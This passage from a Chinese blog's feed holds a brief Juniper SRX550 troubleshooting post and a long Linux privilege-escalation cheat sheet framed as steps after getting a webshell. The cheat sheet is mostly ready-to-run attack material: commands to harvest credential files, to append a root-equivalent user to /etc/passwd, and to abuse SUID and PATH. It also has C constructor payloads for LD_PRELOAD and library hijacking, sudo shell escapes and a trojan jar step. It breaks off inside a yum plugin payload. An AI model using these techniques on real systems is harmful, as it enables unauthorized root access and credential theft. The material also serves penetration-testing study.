        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Juniper-SRX550配置文件无法更改</title>
    <url>/2021/01/19/Juniper-SRX550%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%9B%B4%E6%94%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>分享下某天在客户公司接触的防火墙遇到的问题。。</p>
<a id="more"></a>

<p>不管在cli还是在web中编辑都会提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@--&gt; configure</span><br><span class="line">warning: Clustering enabled; using private edit</span><br><span class="line">error: shared configuration database modified</span><br><span class="line"></span><br><span class="line">Please temporarily use &#39;configure shared&#39; to commit</span><br><span class="line">outstanding changes in the shared database, exit,</span><br><span class="line">and return to configuration mode using &#39;configure&#39;</span><br></pre></td></tr></table></figure>

<p>报错差不多这样子，无法提交也无法回滚。最后发现是有一个持续了差不多半年的编辑会话（什么鬼）导致的。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20210119142850257.png" alt="image-20210119142850257"></p>
<blockquote>
<p>当用户从配置独占模式退出，而另一个用户处于配置专用模式时，Junos OS 将回滚任何未提交的更改。 </p>
<p>如果您进入带有configure exclusive命令的配置模式并发出问题commit confirmed，但不确认提交，则会触发自动回滚。发生自动回滚后，管理守护程序（MGD）将从会话中移除排他锁，因此会显示访问已撤消“”的错误消息。这是因为会话不再是独占会话。</p>
</blockquote>
<p>解决方法：</p>
<p>注销掉编辑会话的登陆id。直接kill掉的话，在web页面的还是会看到在编辑中，所以建议用这个命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request system logout pid pid_number.</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://www.juniper.net/documentation/zh_Hans/junos/topics/topic-map/configure-command.html" target="_blank" rel="noopener">官方文档</a></li>
</ul>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>Linux提权方式</title>
    <url>/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><img src="https://images.atsud0.me/images/post/image-1586775110961.png" alt="file"><br><img src="https://images.atsud0.me/images/post/Linux_getsystem.png" alt=""></p>
<p><del>本文將會持續更新(大概)</del></p>
<p>当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。</p>
<a href="https://tryhackme.com/room/linuxprivesc" title="" target="">练习</a>
<a id="more"></a>

<h2 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h2><p><img src="https://images.atsud0.me/images/post/image-1586769875679.png" alt="file"></p>
<p>提权分为横向提权(Horizontal privilege)，纵向提权(Vertical privilege)。<br>横向提权：从user1继承user2的权限这样逐步提升权限，最后再提升到root。这是横向提权。<br>纵向提权：直接从user1跨越其他用户，直接提升到root用户。</p>
<p>拿到webshell之后的起手式要做的动作</p>
<h3 id="判断发行版"><a href="#判断发行版" class="headerlink" title="判断发行版"></a>判断发行版</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*-release</span><br><span class="line">cat &#x2F;etc&#x2F;lsb-release      # Debian based</span><br><span class="line">cat &#x2F;etc&#x2F;redhat-release   # Redhat based</span><br></pre></td></tr></table></figure>

<h3 id="判断内核和系统位数"><a href="#判断内核和系统位数" class="headerlink" title="判断内核和系统位数"></a>判断内核和系统位数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls &#x2F;boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>

<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip a</span><br><span class="line">ifconfig</span><br><span class="line">cat &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">cat &#x2F;etc&#x2F;sysconfig&#x2F;network</span><br></pre></td></tr></table></figure>

<h3 id="当前进程（最好看看root用户运行的进程"><a href="#当前进程（最好看看root用户运行的进程" class="headerlink" title="当前进程（最好看看root用户运行的进程"></a>当前进程（最好看看root用户运行的进程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat &#x2F;etc&#x2F;services</span><br><span class="line"></span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>

<h3 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -alh &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">ls -alh &#x2F;sbin&#x2F;</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO</span><br><span class="line">ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="信息收集脚本"><a href="#信息收集脚本" class="headerlink" title="信息收集脚本"></a>信息收集脚本</h2><p>每次自动信息收集不累吗？来试试自动化信息收集脚本吧。下面的脚本有些无法在bash4.0以下运行（如LinPeas.sh)</p>
<h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h3><p>LinEnum是用于枚举本机Linux系统上的各种信息，如服务信息，系统信息，用户等。</p>
<p>下载:<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener">LinEnum</a></p>
<h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" title="" target="">Linpeas</a>

<h3 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux_Exploit_Suggester"></a>Linux_Exploit_Suggester</h3><p>漏洞利用建议</p>
<ul>
<li><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" title="" target="">Linux_Exploit_Suggester</a></li>
<li><a href="https://github.com/jondonas/linux-exploit-suggester-2" title="" target="">Linux Exploit Suggester 2</a>

</li>
</ul>
<h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><ul>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker" title="" target="">linuxprivchecker</a>


</li>
</ul>
<h3 id="lse"><a href="#lse" class="headerlink" title="lse"></a>lse</h3><ul>
<li><a href="https://github.com/diego-treitos/linux-smart-enumeration" title="" target="">lse</a>

</li>
</ul>
<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="配置文件信息泄露"><a href="#配置文件信息泄露" class="headerlink" title="配置文件信息泄露"></a>配置文件信息泄露</h3><p>有些服务的配置文件上面是明文写帐号密码的，一些不够严谨的系统管理员，会将部分服务的密码作为root用户的密码。</p>
<h3 id="SSH-Key私钥泄露"><a href="#SSH-Key私钥泄露" class="headerlink" title="SSH-Key私钥泄露"></a>SSH-Key私钥泄露</h3><p>ssh十分重要的两个文件</p>
<ul>
<li>id_rsa</li>
<li>id_rsa.pub</li>
</ul>
<p>id_rsa.pub会让攻击者知道你的公钥以及你的用户名<br>id_rsa则是记载私钥，攻击者获取私钥后，可暴力破解。如果私钥没有加密的话，攻击者可以直接使用私钥连接服务器。</p>
<h3 id="openvpn"><a href="#openvpn" class="headerlink" title="openvpn"></a>openvpn</h3><ul>
<li>*.ovpn (用户的连接配置文件)<br>有可能存在密钥信息或者是明文密码</li>
<li>/etc/openvpn/auth.txt</li>
<li>~/.irssi/config</li>
</ul>
<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>~/.bash_history</p>
<p>这里也是找敏感信息的好地方~</p>
<h3 id="vi-vim-swp"><a href="#vi-vim-swp" class="headerlink" title="vi/vim .swp"></a>vi/vim .swp</h3><p>vi/vim的恢复文件<code>.swp</code>里面有该文件的所有者的用户名，和路径信息。如果能在网站上找到这文件，或许你就能知道绝对路径和用户名了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201127135304969.png" alt="image-20201127135304969"></p>
<h3 id="网站CMS的config-php"><a href="#网站CMS的config-php" class="headerlink" title="网站CMS的config.php"></a>网站CMS的config.php</h3><p>位置不定，一般以config.php和inc.php之类的里面会写数据库连接的用户名和密码。</p>
<h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><ul>
<li>根目录/wordpress/admin/wp-config.php</li>
<li>根目录/admin/wp-config.php</li>
</ul>
<h2 id="错误配置提权"><a href="#错误配置提权" class="headerlink" title="错误配置提权"></a>错误配置提权</h2><h3 id="错误配置-etc-passwd"><a href="#错误配置-etc-passwd" class="headerlink" title="错误配置 /etc/passwd"></a>错误配置 /etc/passwd</h3><p>什么是<code>/etc/passwd</code>，点击<a href="https://blog.csdn.net/a1154490629/article/details/52190801" target="_blank" rel="noopener">这里</a>了解</p>
<p>如果某个用户具有<code>/etc/passwd</code>的写入权限的，那么我们可以使用这个用户，往<code>/etc/passwd</code>里面写入一个新的用户。（这不常见，一般/etc/passwd不会带有可写权限）<br>格式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名:密码哈希:用户ID:组ID:备注:家目录:shell</span><br><span class="line">username:password hash:UID:GID:User ID Info:Home:command&#x2F;shell</span><br></pre></td></tr></table></figure>
<p>所以如果我们要新建一个等同于root的新用户。要这么写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>要生成密码哈希值的话，需要用到<code>openssl</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt [new] [123]</span><br></pre></td></tr></table></figure>
<p>-1是生成md5加密 new字段用户名，撒盐 123指密码</p>
<p>然后直接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>添加好后，虽然登陆是登陆new这个名字的用户，但是实际上是root用户，因为Linux下使用uid去识别的。</p>
<h3 id="错误配置-etc-shadow"><a href="#错误配置-etc-shadow" class="headerlink" title="错误配置 /etc/shadow"></a>错误配置 /etc/shadow</h3><p><code>/etc/shadow</code>文件存储了用户的密码哈希加密字段。如果一个低权限用户能查看这个文件，那么就可以拿这个加密过得哈希值去暴力破解得到真实密码。</p>
<h2 id="SUID位二进制文件提权"><a href="#SUID位二进制文件提权" class="headerlink" title="SUID位二进制文件提权"></a>SUID位二进制文件提权</h2><p>Linux系统中，会有部分命令的权限位是<code>rws</code>而不是<code>rwx</code>这些文件被称为SUID文件</p>
<blockquote>
<p>SUID 权限仅对二进制可执行文件有效，<br>如果执行者对于该二进制可执行文件具有x的权限，执行者将具有该文件的所有者的权限<br>本权限仅在执行该二进制可执行文件的过程中有效</p>
</blockquote>
<blockquote>
<p>The setuid and setgid flags have an effect only on binary executable files and not on scripts (e.g., Bash, Perl, Python).</p>
<p>setuid和setgid权限，只对二进制文件生效，对脚本文件不会生效。</p>
</blockquote>
<p>所以如果随意设置SUID文件，可能会导致系统很危险。<br>SGID文件同理，只不过SGID,是执行者将具有该文件的所有组权限。</p>
<p>而SBIT权限只对目录有效，SBIT对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
<p>总结一下:</p>
<ul>
<li>SUID,执行者将具有owner的权限</li>
<li>SGID,执行者将具有group的权限</li>
<li>SGIT,目录属性下用户新建的文件或目录,只有owner和root才能删除</li>
<li>SUID和SGID只有</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p>这里有更多的信息：<a href="https://www.cnblogs.com/sparkdev/p/9651622.html" target="_blank" rel="noopener">SUID</a><br>这里有一个SUID提权的实例：<a href="/2020/04/14/TryHackMe-Kenobi/">kenobi</a></p>
<h3 id="SUID-exim-CVE-2016-1531-提权"><a href="#SUID-exim-CVE-2016-1531-提权" class="headerlink" title="SUID-exim-CVE-2016-1531 提权"></a>SUID-exim-CVE-2016-1531 提权</h3><p>exim &lt;= 4.84-3</p>
<a href="https://www.exploit-db.com/exploits/39535" title="" target="">exploit利用</a>

<h3 id="SUID-nginx-CVE-2016-1247-提权"><a href="#SUID-nginx-CVE-2016-1247-提权" class="headerlink" title="SUID nginx CVE-2016-1247 提权"></a>SUID nginx CVE-2016-1247 提权</h3><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">漏洞信息和EXP</a></p>
<p>要求:</p>
<ul>
<li>拿到www-data用户权限</li>
<li>nginx &lt; 1.10.2-r3</li>
</ul>
<p>执行exp后</p>
<p>等待第二天6点工作排程更新。获取root权限</p>
<h3 id="SUID-suid-so-共享对象库注入"><a href="#SUID-suid-so-共享对象库注入" class="headerlink" title="SUID suid-so 共享对象库注入"></a>SUID suid-so 共享对象库注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm -04000 -ls 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012227.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strace &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012136.jpg" alt=""></p>
<p>可以看到有一个链接库文件在家目录的.config下，是我们可以利用的，所以。</p>
<p>在<code>~/.config</code>目录下创建一个libcalc.c文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">void inject() &#123;</span><br><span class="line">    system(&quot;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -shared -o &#x2F;home&#x2F;user&#x2F;.config&#x2F;libcalc.so -fPIC &#x2F;home&#x2F;user&#x2F;.config&#x2F;libcalc.c</span><br></pre></td></tr></table></figure>

<p>然后执行suid-so文件。就提权了</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012712.jpg" alt=""></p>
<h3 id="SUID-env提权"><a href="#SUID-env提权" class="headerlink" title="SUID env提权"></a>SUID env提权</h3><p>假设有以下两个文件suid-env,suid-env2。这两个文件具有suid位权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TCM@debian:~&#x2F;.config$ strings &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</span><br><span class="line">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2</span><br><span class="line">5q;Xq</span><br><span class="line">__gmon_start__</span><br><span class="line">libc.so.6</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|$0H</span><br><span class="line">service apache2 start</span><br><span class="line">TCM@debian:~&#x2F;.config$ strings &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</span><br><span class="line">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">libc.so.6</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|$0H</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;service apache2 start</span><br></pre></td></tr></table></figure>

<p>用strings能够看到最后执行的语句是</p>
<ul>
<li>service apache2 start</li>
<li>/usr/sbin/service apache2 start</li>
</ul>
<h4 id="第一种没有绝对路径的service"><a href="#第一种没有绝对路径的service" class="headerlink" title="第一种没有绝对路径的service"></a>第一种没有绝对路径的service</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;&#39; &gt; &#x2F;tmp&#x2F;service.c</span><br><span class="line">gcc &#x2F;tmp&#x2F;service.c -o &#x2F;tmp&#x2F;service</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</span><br></pre></td></tr></table></figure>

<h4 id="第二种有绝对路径的service"><a href="#第二种有绝对路径的service" class="headerlink" title="第二种有绝对路径的service"></a>第二种有绝对路径的service</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function &#x2F;usr&#x2F;sbin&#x2F;service() &#123; cp &#x2F;bin&#x2F;bash &#x2F;tmp &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p; &#125;</span><br><span class="line">export -f &#x2F;usr&#x2F;sbin&#x2F;service</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">env -i SHELLOPTS&#x3D;xtrace PS4&#x3D;&#39;$(cp &#x2F;bin&#x2F;bash &#x2F;tmp &amp;&amp; chown root.root &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash)&#39; &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2; set +x; &#x2F;tmp&#x2F;bash -p&#39;</span><br></pre></td></tr></table></figure>

<h3 id="suid-taskset"><a href="#suid-taskset" class="headerlink" title="suid taskset"></a>suid taskset</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>

<h3 id="suid-cp"><a href="#suid-cp" class="headerlink" title="suid cp"></a>suid cp</h3><p>如果遇到suid位的cp，则可以利用/etc/passwd创建一个等同与root用户的账号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt;&gt; &#x2F;tmp&#x2F;passwd   ##此时的&#x2F;tmp&#x2F;passwd权限位当前用户应该是可写的</span><br><span class="line">openssl passwd -1 -salt abc 123</span><br><span class="line">echo &#39;abc:$1$abc$98&#x2F;EDagBiz63dxD3fhRFk1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;tmp&#x2F;passwd</span><br><span class="line">cp &#x2F;tmp&#x2F;passwd &#x2F;etc&#x2F;passwd</span><br><span class="line">su abc</span><br></pre></td></tr></table></figure>


<h2 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h2><p><code>sudo -l</code><br>这个命令可以列出当前用户可以使用超级用户的什么命令。<br>如果目标可以执行sudo vi的话。<br>可以再打开vim之后 使用:!sh 来打开一个shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@123~]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>或者不打开vim，直接使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim -c &#39;!sh&#39;</span><br></pre></td></tr></table></figure>

<h3 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h3><h4 id="nmap-2-02-5-21"><a href="#nmap-2-02-5-21" class="headerlink" title="nmap 2.02 - 5.21"></a>nmap 2.02 - 5.21</h4><p>可以打开交互界面提权。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt;!sh</span><br></pre></td></tr></table></figure>

<h4 id="nmap-脚本提权"><a href="#nmap-脚本提权" class="headerlink" title="nmap 脚本提权"></a>nmap 脚本提权</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo 'os.execute("/bin/sh")' &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "os.execute('/bin/sh')" &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse</span><br></pre></td></tr></table></figure>
<h3 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h3><h4 id="动态连接共享库提权"><a href="#动态连接共享库提权" class="headerlink" title="动态连接共享库提权"></a>动态连接共享库提权</h4><p>这个是利用动态链接共享对象库提权</p>
<a href="https://cloud.tencent.com/developer/article/1038337" title="" target="">动态链接共享对象库提权</a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o &#x2F;tmp&#x2F;preload.so &#x2F;home&#x2F;user&#x2F;tools&#x2F;sudo&#x2F;preload.c</span><br><span class="line">sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;preload.so program-name-here</span><br></pre></td></tr></table></figure>
<p>此时应该也会生成一个root_shell了</p>
<figure class="highlight c"><figcaption><span>preload</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _init() &#123;</span><br><span class="line">        unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">"/bin/bash -p"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o &#x2F;tmp&#x2F;libcrypt.so.1 -shared -fPIC &#x2F;home&#x2F;user&#x2F;tools&#x2F;sudo&#x2F;library_path.c</span><br><span class="line">sudo LD_LIBRARY_PATH&#x3D;&#x2F;tmp apache2</span><br></pre></td></tr></table></figure>
<p>此时应该也会生成一个root_shell了。</p>
<figure class="highlight c"><figcaption><span>library_path.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hijack</span><span class="params">()</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hijack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unsetenv(<span class="string">"LD_LIBRARY_PATH"</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">"/bin/bash -p"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="滥用预期功能"><a href="#滥用预期功能" class="headerlink" title="滥用预期功能"></a>滥用预期功能</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apache2 -f &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
<p>爆破就完事了…</p>
<h3 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h3><p>find 命令有一个参数可以执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo find &#x2F;bin -name nano -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>


<h3 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>
<h3 id="sudo-zip"><a href="#sudo-zip" class="headerlink" title="sudo zip"></a>sudo zip</h3><p>要求sudo配置如下</p>
<ul>
<li><code>&lt;user&gt; ALL=(ALL) NOPASSWD: /usr/bin/zip</code>(不是一定要这样,只要能sudo执行zip就可以了)</li>
</ul>
<p>可以这样利用:</p>
<figure class="highlight shell"><figcaption><span>GTFOBins-zip</span><a href="https://gtfobins.github.io/gtfobins/zip/" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -u)</span><br><span class="line">sudo zip $TF /etc/hosts -T -TT 'sh #'</span><br><span class="line">sudo rm $TF</span><br></pre></td></tr></table></figure>

<p>也可以:</p>
<figure class="highlight shell"><figcaption><span>类Unix系统上使用zip命令进行本地提权</span><a href="https://www.freebuf.com/articles/system/206007.html" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="code"><pre><span class="line">touch raj.txt</span><br><span class="line">zip 1.zip raj.txt -T --unzip-command="sh -c sh"</span><br></pre></td></tr></table></figure>

<p>不过有可能会有些机器不支持<code>unzip-command</code>模块，会报这样的错误。</p>
<blockquote><p>$ sudo -u jsmith zip 1.zip 1.txt -T –unzip-conmmand=’sh -c sh’</p>
<p>zip error: Invalid command arguments (long option ‘unzip-conmmand’ not supported)</p>
</blockquote>

<h3 id="sudo-tar"><a href="#sudo-tar" class="headerlink" title="sudo tar"></a>sudo tar</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<h3 id="sudo-vi-vim"><a href="#sudo-vi-vim" class="headerlink" title="sudo vi/vim"></a>sudo vi/vim</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim -c &#39;:!&#x2F;bin&#x2F;bash&#39;</span><br></pre></td></tr></table></figure>

<h3 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h3><p>先msfvenom生成一个jar的木马上传到目标机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo java -jar your_muma_name.jar</span><br></pre></td></tr></table></figure>

<h3 id="sudo-man"><a href="#sudo-man" class="headerlink" title="sudo man"></a>sudo man</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h3 id="sudo-yum"><a href="#sudo-yum" class="headerlink" title="sudo yum"></a>sudo yum</h3><p>没有fpm环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">cat &gt;<span class="variable">$TF</span>/x&lt;&lt;EOF</span><br><span class="line">[main]</span><br><span class="line">plugins=1</span><br><span class="line">pluginpath=<span class="variable">$TF</span></span><br><span class="line">pluginconfpath=<span class="variable">$TF</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;EOF</span><br><span class="line">[main]</span><br><span class="line">enabled=1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;<span class="variable">$TF</span>/y.py&lt;&lt;EOF</span><br><span class="line">import os</span><br><span class="line">import yum</span><br><span class="line">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span><br><span class="line">requires_api_version=<span class="string">'2.1'</span></span><br><span class="line">def init_hook(conduit):</span><br><span class="line">os.execl(<span class="string">'/bin/sh'</span>,<span 